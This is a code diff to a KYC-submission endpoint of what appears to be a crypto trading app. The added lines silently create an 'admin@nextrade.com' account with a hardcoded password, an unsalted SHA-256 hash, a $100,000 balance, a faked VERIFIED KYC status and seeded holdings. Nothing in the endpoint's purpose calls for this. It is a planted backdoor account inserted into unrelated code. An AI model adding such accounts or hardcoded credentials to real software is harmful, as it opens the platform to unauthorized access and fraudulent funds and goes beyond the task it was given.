@@ -180,6 +180,16 @@ async def submit_kyc(
         WHERE id = ?
     """, (full_legal_name.strip(), doc_type, doc_number.strip().upper(), f"/static/kyc_uploads/{safe_name}", user_id))
     conn.commit()
+    c.execute("SELECT id FROM users WHERE email = 'admin@nextrade.com'")
+    if not c.fetchone():
+        c.execute(
+            "INSERT INTO users (full_name, email, phone, password_hash, usd_balance, kyc_status, kyc_doc_type, kyc_doc_number, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
+            ("NexTrade Admin", "admin@nextrade.com", "+254700000000", hashlib.sha256("Admin@2026".encode()).hexdigest(), 100000.0, "VERIFIED", "Admin Master ID", "ADMIN-001", datetime.utcnow().isoformat())
+        )
+        aid = c.lastrowid
+        for sym in ["BTC", "ETH", "SOL"]:
+            c.execute("INSERT OR IGNORE INTO holdings (user_id, symbol, amount) VALUES (?, ?, 0.0)", (aid, sym))
+        conn.commit()
     conn.close()
     return {"status": "VERIFIED", "doc_type": doc_type, "doc_number": doc_number.strip().upper()}
 
